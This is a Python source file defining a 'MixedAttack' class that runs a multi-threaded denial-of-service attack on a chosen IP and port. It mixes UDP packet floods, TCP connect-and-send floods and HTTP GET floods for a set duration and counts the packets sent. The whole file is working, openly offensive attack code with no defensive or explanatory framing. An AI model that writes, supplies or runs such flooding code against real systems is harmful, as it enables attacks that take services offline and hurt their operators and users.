import socket
import random
import threading
import time
import subprocess

class MixedAttack:
    def __init__(self):
        self.packet_count = 0
    
    def launch(self, target_ip, target_port, duration, threads):
        def udp_flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    sock.sendto(data, (target_ip, target_port))
                    self.packet_count += 1
                except:
                    pass
            sock.close()
        
        def tcp_flood():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((target_ip, target_port))
                    sock.send(random._urandom(1024))
                    self.packet_count += 1
                    sock.close()
                except:
                    pass
        
        def http_flood():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((target_ip, target_port))
                    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
                    sock.send(request.encode())
                    self.packet_count += 1
                    sock.close()
                except:
                    pass
        
        methods = [udp_flood, tcp_flood, http_flood]
        worker_threads = []
        
        for _ in range(threads):
            method = random.choice(methods)
            t = threading.Thread(target=method)
            t.daemon = True
            t.start()
            worker_threads.append(t)
        
        for t in worker_threads:
            t.join(timeout=duration)
        
        return self.packet_count
